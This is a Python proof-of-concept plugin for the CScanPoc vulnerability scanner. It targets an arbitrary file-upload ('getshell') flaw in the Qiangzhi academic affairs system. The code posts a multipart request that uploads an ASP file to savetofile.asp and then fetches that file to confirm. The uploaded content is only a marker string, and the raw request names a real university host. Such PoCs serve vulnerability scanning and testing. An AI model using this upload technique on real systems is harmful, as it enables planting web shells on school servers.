# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Qiangzhi_0001'  # 平台漏洞编号，留空
    name = '强智教务系统通杀Getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-11-27'  # 漏洞公布时间
    desc = '''
        强智教务系统是由湖南强智科技发展有限公司打造的一款中和教务服务系统。
        强智教务系统通杀Getshell.
        /jiaowu/jwgl/jcxx/savetofile.asp
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=074367'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '强智教务系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '36802f4c-024c-48f1-8824-ef8c1ec93883'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            raw1 = '''
POST /jiaowu/jwgl/jcxx/savetofile.asp HTTP/1.1
Host: jwc.whhhxy.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------496647414724
Content-Length: 304

-----------------------------496647414724
Content-Disposition: form-data; name="uploadfile"; filename="1.asp"
Content-Type: application/octet-stream

c42ca4238a0b923820dcc509a6f75849b
-----------------------------496647414724
Content-Disposition: form-data; name="Button2"

ÉÏ´«
-----------------------------496647414724--
                '''
            url = arg+"/jwgl/jcxx/savetofile.asp"
            url2 = arg+"/jwgl/jcxx/1.asp"

            code, head, res, errcode, _ = hh.http(url, raw=raw1)
            code1, head1, res1, errcode, _ = hh.http(url2)
            if code == 200 and 'c42ca4238a0b923820dcc509a6f75849b' in res1:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
